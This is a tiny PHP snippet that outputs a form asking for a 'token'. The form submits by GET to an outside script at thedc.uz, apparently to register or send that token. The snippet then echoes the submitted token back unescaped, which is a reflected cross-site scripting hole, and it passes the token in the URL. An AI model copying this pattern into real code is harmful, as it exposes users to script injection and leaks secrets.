<?


echo'<form method="get" action="https://thedc.uz/wh.php">
         ism<br/>
         <input name="token" size=25> 
         <P><input type="submit" value="     ok     "><br/>';
echo $_GET["token"];